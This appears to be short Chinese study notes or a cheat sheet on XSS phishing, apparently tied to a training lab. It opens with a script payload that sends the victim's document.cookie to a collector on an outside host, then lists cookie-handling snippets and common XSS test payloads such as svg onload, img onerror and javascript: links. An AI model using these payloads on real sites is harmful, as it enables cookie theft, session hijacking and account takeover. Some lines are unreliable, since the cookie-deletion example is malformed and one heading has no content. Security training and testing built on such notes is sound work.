# XSS 钓鱼

```javascript
<script>document.location='http://192.168.2.5:8080/pkxss/xcookie/cookie.php?cookie='+document.cookie</script>
```





等价扩展名:

### javascript 操作cookie的几种方式

```javascript
document.cookie
-- 显示cookie

document.cookie="usernmae=value"
-- 添加一个新属性 或修改(如果不存在则添加，存在则修改)

document.cookie="Thu,01 Jan 1970 00:00:00 GTM"
-- 删除cookie 将cookie的过期时间设置为当前时间之前的时间即可。

```



**常用测试语句**

```javascript
'> value='' 

'> onmouseover='alert(1)'

' onmouseover='alert(/xss)'> 

<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<a href=javascript:alert(123)>

# 测试以下关键字是否会被过滤
<script " ' Oonn>


'><a href='javascript:alert:alert(/xss/)'>click</a>
```

